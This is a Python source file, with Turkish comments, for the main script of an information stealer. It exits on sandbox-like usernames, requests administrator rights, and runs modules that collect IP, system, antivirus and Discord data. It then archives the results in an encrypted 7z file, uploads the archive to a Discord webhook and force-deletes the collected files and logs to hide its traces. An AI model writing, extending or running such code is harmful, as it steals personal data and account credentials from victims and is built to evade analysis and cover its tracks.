import threading
import time
import sys
import os
import ctypes
import getpass
import py7zr
import shutil
import logging
from datetime import datetime
from pathlib import Path

# Scraper'ları import et
import utils.ipdata as ipdata
import utils.msinfo as msinfo
import utils.antivirus as antivirus
import utils.discord as discord
import utils.vissee as vissee

blacklistUsers = ['WDAGUtilityAccount', 'test', 'Guest', 'DefaultAccount']
username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

antivirus_folders = [
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Local"),
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Roaming"),
]

def is_admin():
    """Yönetici yetkilerini kontrol et"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Scripti yönetici olarak yeniden çalıştır"""
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:])
           
            ret = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable,
                params,
                None,
                1  # SW_HIDE
            )
           
            if ret <= 32:  # Error codes
                raise Exception(f"ShellExecute failed with code {ret}")
               
            sys.exit(0)
        except Exception as e:
            print(f"Hata: Yönetici izinleri alınamadı - {e}")
            time.sleep(3)
            sys.exit(1)

def run_scraper(func):
    """Thread içinde scraper'ı çalıştır"""
    result = [None]
    error = [None]
   
    def wrapper():
        try:
            result[0] = func()
        except Exception as e:
            error[0] = e
            print(f"Scraper hatası: {e}")
   
    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout=300)  # 5 dakika timeout
   
    while thread.is_alive():
        time.sleep(1)
    
    if error[0]:
        print(f"Thread'de hata oluştu: {error[0]}")
   
    return result[0]

def close_all_loggers():
    """Tüm logger'ları kapat ve handler'ları temizle"""
    try:
        # Root logger'ı al
        root_logger = logging.getLogger()
        
        # Tüm handler'ları kapat ve kaldır
        handlers = root_logger.handlers[:]
        for handler in handlers:
            try:
                handler.close()
                root_logger.removeHandler(handler)
            except:
                pass
        
        # Tüm logger'ları kapat
        logging.shutdown()
        
        # Biraz bekle - dosyaların serbest bırakılması için
        time.sleep(1)
        
    except Exception as e:
        print(f"Logger kapatma hatası: {e}")

def zip_temp_folder():
    """Temp klasöründeki lunix klasörünü şifreli olarak ziple"""
    temp_lunix = os.path.expandvars(rf"C:\Users\{username}\AppData\Local\Temp\lunix")
    
    if not os.path.exists(temp_lunix):
        print(f"Lunix klasörü bulunamadı: {temp_lunix}")
        return None
       
    current_time = datetime.now().strftime('%H_%M_%S')
    zip_name = f"{username}_{current_time}.7z"
    zip_path = os.path.join(os.path.expandvars("%temp%"), zip_name)
   
    try:
        # 7z arşivi oluştur ve şifrele
        with py7zr.SevenZipFile(zip_path, 'w', password=zip_name) as archive:
            archive.writeall(temp_lunix, 'lunix')
        
        print(f"Arşiv oluşturuldu: {zip_path}")
        return zip_path
       
    except Exception as e:
        print(f"Hata: Arşivleme işlemi başarısız - {e}")
        return None

def force_delete_file(file_path, max_attempts=5):
    """Dosyayı zorla sil - birden fazla yöntem dene"""
    for attempt in range(max_attempts):
        try:
            if not os.path.exists(file_path):
                return True
            
            # Dosya özniteliklerini değiştir
            try:
                os.chmod(file_path, 0o777)
            except:
                pass
            
            # Normal silme
            os.remove(file_path)
            return True
            
        except Exception as e:
            if attempt < max_attempts - 1:
                time.sleep(0.5)
            else:
                # Son deneme: Windows komutu
                try:
                    os.system(f'del /f /q "{file_path}" 2>nul')
                    time.sleep(0.5)
                    if not os.path.exists(file_path):
                        return True
                except:
                    pass
                print(f"Dosya silinemedi: {file_path} - {e}")
                return False
    return False

def force_delete_directory(dir_path, max_attempts=5):
    """Klasörü zorla sil - birden fazla yöntem dene"""
    for attempt in range(max_attempts):
        try:
            if not os.path.exists(dir_path):
                return True
            
            # İçeriği temizle
            for root, dirs, files in os.walk(dir_path, topdown=False):
                for name in files:
                    file_path = os.path.join(root, name)
                    force_delete_file(file_path, max_attempts=2)
                
                for name in dirs:
                    try:
                        os.rmdir(os.path.join(root, name))
                    except:
                        pass
            
            # Ana klasörü sil
            os.rmdir(dir_path)
            return True
            
        except Exception as e:
            if attempt < max_attempts - 1:
                time.sleep(1)
            else:
                # Son deneme: Windows komutu
                try:
                    os.system(f'rmdir /s /q "{dir_path}" 2>nul')
                    time.sleep(1)
                    if not os.path.exists(dir_path):
                        return True
                except:
                    pass
                print(f"Klasör silinemedi: {dir_path} - {e}")
                return False
    return False

def cleanup_files(zip_path):
    """Oluşturulan dosyaları temizle"""
    print("Temizlik işlemi başlatılıyor...")
    
    # ÖNEMLİ: Önce tüm logger'ları kapat
    close_all_loggers()
    
    # Biraz bekle - dosyaların tamamen serbest bırakılması için
    time.sleep(2)
    
    try:
        lunix_dir = Path(rf"C:\Users\{username}\AppData\Local\Temp\lunix")
        
        # Lunix klasörünü temizle
        if lunix_dir.exists():
            print("Lunix klasörü temizleniyor...")
            
            # Antivirus log dosyasını özellikle sil
            antivirus_log = lunix_dir / "antivirus" / "antivirus.log"
            if antivirus_log.exists():
                print("Antivirus log dosyası siliniyor...")
                force_delete_file(str(antivirus_log))
            
            # Diğer tüm dosyaları sil
            success = force_delete_directory(str(lunix_dir))
            if success:
                print("✓ Lunix klasörü başarıyla silindi!")
            else:
                print("✗ Lunix klasörü tamamen silinemedi, bazı dosyalar kaldı")
        
        # Zip dosyasını sil
        if zip_path and os.path.exists(zip_path):
            print("Zip dosyası siliniyor...")
            time.sleep(1)
            
            success = force_delete_file(zip_path)
            if success:
                print("✓ Zip dosyası başarıyla silindi!")
            else:
                print("✗ Zip dosyası silinemedi")
        
        print("Temizlik tamamlandı!")
        
    except Exception as e:
        print(f"Temizlik sırasında genel hata: {e}")

def main():
    # Yönetici izinlerini kontrol et
    run_as_admin()
   
    zip_path = None
    
    try:
        # Yönetici izinleri alındı, scraper'ları çalıştır
        print("IPData taraması başlatılıyor...")
        ipdata_result = run_scraper(ipdata.run_ipdata)
        
        print("MSInfo taraması başlatılıyor...")
        msinfo_result = run_scraper(msinfo.run_msinfo_scraper)
        
        print("Antivirus taraması başlatılıyor...")
        antivirus_result = run_scraper(
            lambda: antivirus.main(
                folders_to_scan=antivirus_folders, 
                clear_logs=True, 
                max_dirs_per_root=None
            )
        )
        
        print("Discord taraması başlatılıyor...")
        discord_result = run_scraper(discord.main)
        
        time.sleep(2)
        
        # Bütün işlemler bittikten sonra klasörü ziple
        print("Dosyalar arşivleniyor...")
        zip_path = zip_temp_folder()
        
        if zip_path:
            print("Vissee'ye yükleme başlatılıyor...")
            vissee_result = run_scraper(
                lambda: vissee.main(
                    file_path=zip_path, 
                    webhook="https://discord.com/api/webhooks/{enter webhook}" #The webhook that I had previously forgotten to delete revoked.
                )
            )
            
            # Upload işleminin tamamlanması için bekle
            time.sleep(3)
    
    finally:
        # Her durumda temizlik yap
        cleanup_files(zip_path)

if __name__ == "__main__":
    main()
